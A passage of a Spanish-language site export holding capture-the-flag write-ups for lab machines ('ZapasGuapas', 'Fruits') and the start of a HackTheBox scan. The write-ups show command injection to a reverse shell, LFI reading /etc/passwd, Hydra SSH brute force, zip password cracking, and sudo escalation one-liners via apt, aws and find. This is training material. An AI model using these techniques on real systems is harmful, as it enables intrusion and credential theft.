-p22,80 -sCV 192.168.231.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 13:54 CEST Nmap scan report for 192.168.231.131 Host is up (0.00018s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 7e:42:d0:d4:c9:36:f4:f8:e6:77:c2:c6:7e:25:dc:ff (ECDSA) |_ 256 6f:a0:50:44:9f:a2:fb:99:40:f3:90:af:56:cc:34:e3 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Zapasguapas MAC Address: 00:0C:29:C6:42:17 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds\rBien vamos a ver la aplicación web:\nSi vamos probando cosas en la web vemos que no tiene muchas funcionalidades, así que vamos a realizar fuzzing:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] 13:56:49 [7/7] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.131/FUZZ\u0026#34; -e .php,.html,.js,.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.131/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ contact.html [Status: 200, Size: 7694, Words: 2174, Lines: 158, Duration: 1ms] about.html [Status: 200, Size: 8764, Words: 2769, Lines: 178, Duration: 1ms] login.html [Status: 200, Size: 2090, Words: 531, Lines: 50, Duration: 2ms] images [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 60ms] bin [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms] css [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms] index.html [Status: 200, Size: 14085, Words: 4801, Lines: 274, Duration: 169ms] lib [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms] js [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms] javascript [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 2ms] include [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms] testimonial.html [Status: 200, Size: 8587, Words: 2719, Lines: 173, Duration: 3ms] nike.php [Status: 200, Size: 2362, Words: 607, Lines: 78, Duration: 1ms]\rVemos que hay un login.html vamos a ver como es:\nVamos a probar credenciales típicas:\nadmin / admin administrator / admin123 Pero nada funciona, vamos a ver como se tramita nuestra data por detrás con BurpSuite, para ello interceptaremos la consulta de inicio de sesión:\nShell as www-data Vamos a enviarlo al Repeater. Si nos fijamos podremos ver que esta usando el archivo run_command.php así que seguramente este usando uno de los inputs para ejecutar X acción vamos a probar con el parámetro username:\nNada, vamos a probar con el parámetro password:\nTenemos ejecución de código!! Vamos a enviarnos una reverse shell:\nShell as pronike Si leemos el /etc/passwd podremos ver 4 usuarios:\nwww-data@zapasguapas:/var/www/tienda$ cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash test:x:1000:1000:test,,,:/home/test:/bin/bash proadidas:x:1001:1001::/home/proadidas:/bin/bash pronike:x:1002:1002::/home/pronike:/bin/bash\rVamos a ver ambos home, en el home del usuario pronike podremos ver un archivo llamado nota.txt:\nwww-data@zapasguapas:/home$ ls pronike nota.txt\rVamos a leerlo:\nwww-data@zapasguapas:/home$ cat pronike/nota.txt Creo que proadidas esta detras del robo de mi contraseña\rVemos que el usuario comenta que proadidas le robo la contraseña, así que vamos a ir a su home para ver si las encontramos:\nwww-data@zapasguapas:/home$ ls -la proadidas total 32 drwxr-xr-x 3 proadidas proadidas 4096 Jul 17 15:52 . drwxr-xr-x 4 root root 4096 Apr 23 2024 .. lrwxrwxrwx 1 root root 9 Apr 23 2024 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 proadidas proadidas 220 Apr 23 2023 .bash_logout -rw-r--r-- 1 proadidas proadidas 3526 Apr 23 2023 .bashrc -rw------- 1 proadidas proadidas 38 Jul 17 15:52 .lesshst drwxr-xr-x 3 proadidas proadidas 4096 Apr 23 2024 .local -rw-r--r-- 1 proadidas proadidas 807 Apr 23 2023 .profile -r-------- 1 root root 33 Apr 17 2024 user.txt\rNo vemos nada interesante\u0026hellip; Buscando por directorios encontré lo siguiente en /opt/:\nwww-data@zapasguapas:/opt$ ls importante.zip\rVamos a abrir un servidor en python3 y descargarnoslo:\nwww-data@zapasguapas:/opt$ python3 -m http.server 8082\r┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ wget 192.168.231.131:8082/importante.zip Prepended http:// to \u0026#39;192.168.231.131:8082/importante.zip\u0026#39; --2025-07-17 14:09:05-- http://192.168.231.131:8082/importante.zip Connecting to 192.168.231.131:8082... connected. HTTP request sent, awaiting response... 200 OK Length: 266 [application/zip] Saving to: ‘importante.zip’ importante.zip 100%[=================================================================================================\u0026gt;] 266 --.-KB/s in 0s 2025-07-17 14:09:05 (60.8 MB/s) - ‘importante.zip’ saved [266/266]\rBien vamos a intentar descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ unzip importante.zip Archive: importante.zip [importante.zip] password.txt password:\rNos piden credenciales, así que vamos a crackearlo. Para ello sacaremos su hash con zip2john:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ zip2john importante.zip \u0026gt; hash ver 2.0 efh 5455 efh 7875 importante.zip/password.txt PKZIP Encr: TS_chk, cmplen=76, decmplen=71, crc=9CB8F6B5 ts=4C4E cs=4c4e type=8\rAhora vamos a crackearlo con el diccionario rockyou.txt con john indicandole el formato PKZIP:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ john -w=/usr/share/wordlists/rockyou.txt hash --format=PKZIP Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hotstuff (importante.zip/password.txt) 1g 0:00:00:00 DONE (2025-07-17 14:11) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rAhora vamos a descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ unzip importante.zip Archive: importante.zip [importante.zip] password.txt password: inflating: password.txt\rVemos el archivo password.txt vamos a ver su contenido:\nHe conseguido la contraseña de pronike. Adidas FOREVER!!!! pronike11\rBien tenemos las credenciales del usuario pronike vamos acceder por SSH:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ ssh pronike@192.168.231.131 pronike@192.168.231.131\u0026#39;s password: Linux zapasguapas 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 15:45:49 2025 from 192.168.231.128 pronike@zapasguapas:~$\rBien!! Estamos como el usuario pronike\nShell as proadidas Vamos a ver si tiene permisos SUDOERS este usuario:\npronike@zapasguapas:~$ sudo -l Matching Defaults entries for pronike on zapasguapas: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User pronike may run the following commands on zapasguapas: (proadidas) NOPASSWD: /usr/bin/apt\rBien vamos a abusar de el de la siguiente manera:\nsudo -u proadidas /usr/bin/apt changelog apt !/bin/bash\rpronike@zapasguapas:~$ sudo -u proadidas /usr/bin/apt changelog apt Des:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB] Descargados 505 kB en 1s (564 kB/s) proadidas@zapasguapas:/home/pronike$\rBien!! Ya somos el usuario proadidas.\nShell as root Volvamos a ver si tiene permisos SUDOERS:\nproadidas@zapasguapas:/home/pronike$ sudo -l Matching Defaults entries for proadidas on zapasguapas: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User proadidas may run the following commands on zapasguapas: (proadidas) NOPASSWD: /usr/bin/apt (root) NOPASSWD: /usr/bin/aws\rVemos que puede usar el binario aws como root sin necesidad de contraseña, si lo buscamos por GTFObins nos comenta lo siguiente:\nBien vamos a abusar de el:\nproadidas@zapasguapas:/home/pronike$ sudo aws help root@zapasguapas:/home/pronike# whoami root root@zapasguapas:/home/pronike#\rroot! ;)\nReseña ","date":"2025-07-17","id":10,"permalink":"/writeups/thehackerslabs/zapasguapas/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] └─$ nmap -p- --open --min-rate=5000 -n -Pn -vvv 192.168.231.131 Starting Nmap 7.","tags":[],"title":"ZapasGuapas"},{"content":"Enumeration Vamos a empezar con un buen escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 12:27 CEST Initiating ARP Ping Scan at 12:27 Scanning 192.168.231.129 [1 port] Completed ARP Ping Scan at 12:27, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:27 Scanning 192.168.231.129 [65535 ports] Discovered open port 80/tcp on 192.168.231.129 Discovered open port 22/tcp on 192.168.231.129 Completed SYN Stealth Scan at 12:27, 0.80s elapsed (65535 total ports) Nmap scan report for 192.168.231.129 Host is up, received arp-response (0.000043s latency). Scanned at 2025-07-15 12:27:48 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:DC:2D:B0 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos el puerto 80 y 22 abiertos, vamos a enumerar su servicio y dicha versión de el:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p22,80 -sCV 192.168.231.129 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 12:29 CEST Nmap scan report for 192.168.231.129 Host is up (0.00016s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 ae:dd:1a:b6:db:a7:c7:8c:f3:03:b8:05:da:e0:51:68 (ECDSA) |_ 256 68:16:a7:3a:63:0c:8b:f6:ba:a1:ff:c0:34:e8:bf:80 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: P\\xC3\\xA1gina de Frutas |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 00:0C:29:DC:2D:B0 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds\rObtenemos la siguiente información:\nPuerto Descripción 22/tcp OpenSSH 9.2p1 Debian 80/tcp Apache httpd 2.4.57 ((Debian)) Vemos que el posible sistema operativo puede ser un Debian . Vamos a ver la web:\nVemos que es un buscador de frutas, vamos a buscar algo al azar:\nVemos que el archivo buscar.php no existe, así que casi nos cuelan un rabbit hole. Vamos a hacer fuzzing:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.129/FUZZ\u0026#34; -e .php,.html,.js,.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms] .html [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 0ms] [Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms] .php [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3ms] fruits.php [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 0ms]\rVemos el archivo fruits.php , vamos a ver que contiene:\nVemos que está en blanco, vamos a hacer fuzzing por parámetros:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#34;http://192.168.231.129/fruits.php?FUZZ=value\u0026#34; -e .php,.html,.js,.txt -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/fruits.php?FUZZ=value :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response words: 1 ________________________________________________ :: Progress: [32265/32265] :: Job [1/1] :: 83 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\rVemos que no devuleve ningúno, ya que seguramente esté esperando que apuntemos algo en concreto, vamos a probar con un LFI:\nShell as bananaman ?FUZZ=/etc/passwd ┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#34;http://192.168.231.129/fruits.php?FUZZ=/etc/passwd\u0026#34; -e .php,.html,.js,.txt -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/fruits.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response words: 1 ________________________________________________ file [Status: 200, Size: 1128, Words: 6, Lines: 25, Duration: 0ms] :: Progress: [32265/32265] :: Job [1/1] :: 76 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\rVemos que hay una potencial via por LFI , vamos a comprobarlo en la aplicación web:\nTenemos un LFI , vemos el usuario bananaman . Vamos a intentar hacer fuerza bruta al servicio de SSH empleando como usuario bananaman :\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.231.129 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 12:37:33 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://192.168.231.129:22/ [STATUS] 243.00 tries/min, 243 tries in 00:01h, 14344160 to do in 983:50h, 12 active [22][ssh] host: 192.168.231.129 login: bananaman password: celtic 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 4 final worker threads did not complete until end. [ERROR] 4 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-15 12:38:37\rVamos a acceder como el:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ssh bananaman@192.168.231.129 bananaman@192.168.231.129\u0026#39;s password: Linux Fruits 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jul 15 14:23:08 2025 from 192.168.231.128 bananaman@Fruits:~$\rShell as root Teniendo las credenciales válidas del usuario bananaman , vamos a ver si tiene algún permiso en el sudoers:\nbananaman@Fruits:~$ sudo -l Matching Defaults entries for bananaman on Fruits: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User bananaman may run the following commands on Fruits: (ALL) NOPASSWD: /usr/bin/find\rPodemos usar como cualquier usuario sin necesidad de contraseña el binario find , si buscamos en GTFObins lo encontraremos:\nhttps://gtfobins.github.io/gtfobins/find/\nVamos a poner lo indicado:\nsudo find . -exec /bin/bash \\; -quit\rroot@Fruits:/home/bananaman# whoami; hostname -I root 192.168.231.129\rroot! ;)\nReseña ","date":"2025-07-15","id":11,"permalink":"/writeups/thehackerslabs/fruits/","summary":"Enumeration Vamos a empezar con un buen escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.","tags":[],"title":"Fruits"},{"content":"Bienvenidos al apartado de Challenges, donde subiré gran mayoria retos de Web. De plataformas como HackTheBox, HackMyVM\u0026hellip;\nPlataformas 0\n0\n3\n0\nTipos Web\n3\nPhising\n0\n","date":"2023-09-07","id":12,"permalink":"/challenges/intro/bienvenido/","summary":"Bienvenidos al apartado de Challenges, donde subiré gran mayoria retos de Web. De plataformas como HackTheBox, HackMyVM\u0026hellip;\nPlataformas 0\n0","tags":[],"title":"👋 Bienvenido"},{"content":"Bienvenidos a la sección de Writeups, donde subiré writeups de plataformas como HackTheBox.\nEstadísticas writeups 1\n0\n1\n3\n3\n0\n8\n0\n0\nEasy\n7\nMedium\n1\nHard\n0\nInsane\n0\n","date":"2023-09-07","id":13,"permalink":"/writeups/intro/bienvenido/","summary":"Bienvenidos a la sección de Writeups, donde subiré writeups de plataformas como HackTheBox.\nEstadísticas writeups 1\n0\n1\n3\n3","tags":[],"title":"👋 Bienvenido"},{"content":"Enumeration Comenzaremos con un escaneo nmap:\n# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up, received user-set (0.11s latency). Scanned at 2024-08-18 00:54:24 CEST for 176s Not shown: 63221 closed tcp ports (reset), 2311 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkya ynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZ bB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPP mrKMa9NPh1sjHSdS8IwiH12V0= | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI= | 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH 80/tcp open http syn-ack ttl 63 gunicorn | http-methods: |_ Supported Methods: HEAD GET OPTIONS |_http-title: Security Dashboard |_http-server-header: gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:27 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:21 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:22 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94SVN%I=7%D=8/18%Time=66C12A4C%P=x86_64-pc-linux-gnu%r(G SF:etRequest,2F4C,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\ SF:x20Sat,\\x2017\\x20Aug\\x202024\\x2022:55:21\\x20GMT\\r\\nConnection:\\x20close SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20 SF:19386\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;en\\ SF:\u0026#34;\u0026gt;\\n\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;me SF:ta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-sca SF:le=1\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20type=\\\u0026#34;im SF:age/png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.min\\.css SF:\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/ SF:font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\ SF:x20href=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20r SF:el=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carousel\\.mi SF:n\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/stati SF:c/css/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(HTTPOpt 